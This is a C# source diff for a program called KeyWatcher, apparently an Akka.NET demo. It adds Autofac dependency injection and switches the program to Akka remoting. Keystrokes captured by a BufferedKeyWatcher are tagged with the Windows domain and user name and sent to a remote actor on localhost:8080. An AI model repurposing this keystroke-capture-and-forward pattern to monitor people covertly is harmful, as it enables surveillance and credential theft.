@@ -1,6 +1,11 @@
 ﻿using Akka.Actor;
 using Akka.Configuration;
+using Akka.DI.AutoFac;
+using Akka.DI.Core;
+using Autofac;
+using KeyWatcher.Actors;
 using KeyWatcher.Actors.Messages;
+using KeyWatcher.Dependencies;
 using System;
 using System.Windows.Forms;
 
@@ -12,7 +17,8 @@ namespace KeyWatcher.Host
 		{
 			//Program.UseSimpleKeyWatcher();
 			//Program.UseBufferedKeyWatcher();
-			Program.UseAkka();
+			//Program.UseAkkaLocally();
+			Program.UseAkkaWithRemoting();
 		}
 
 		private static void UseBufferedKeyWatcher()
@@ -33,7 +39,34 @@ namespace KeyWatcher.Host
 			}
 		}
 
-		private static void UseAkka()
+		private static void UseAkkaLocally()
+		{
+			var builder = new ContainerBuilder();
+			builder.RegisterModule<DependenciesModule>();
+			builder.RegisterModule<ActorsModule>();
+			var container = builder.Build();
+
+			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
+
+			using (var system = ActorSystem.Create("KeyWatcherHost"))
+			{
+				new AutoFacDependencyResolver(container, system);
+
+				var user = system.ActorOf(system.DI().Props<UserActor>(), "user");
+
+				using (var keyLogger = new BufferedKeyWatcher(10))
+				{
+					keyLogger.KeysLogged += (s, e) =>
+					{
+						user.Tell(new UserKeys(userName, e.Keys));
+					};
+
+					Application.Run();
+				}
+			}
+		}
+
+		private static void UseAkkaWithRemoting()
 		{
 			var config = ConfigurationFactory.ParseString(@"
 akka {
@@ -49,18 +82,18 @@ akka {
 }
 ");
 
-			using (var system = ActorSystem.Create("MyClient", config))
+			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
+
+			using (var system = ActorSystem.Create("KeyWatcherHost", config))
 			{
-				//get a reference to the remote actor
 				var user = system
-					 .ActorSelection("akka.tcp://UserSystem@localhost:8080/user/user");
+					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:8080/user/user");
 
 				using (var keyLogger = new BufferedKeyWatcher(10))
 				{
 					keyLogger.KeysLogged += (s, e) =>
 					{
-						//send a message to the remote actor
-						user.Tell(new UserKeys("me", e.Keys));
+						user.Tell(new UserKeys(userName, e.Keys));
 					};
 
 					Application.Run();
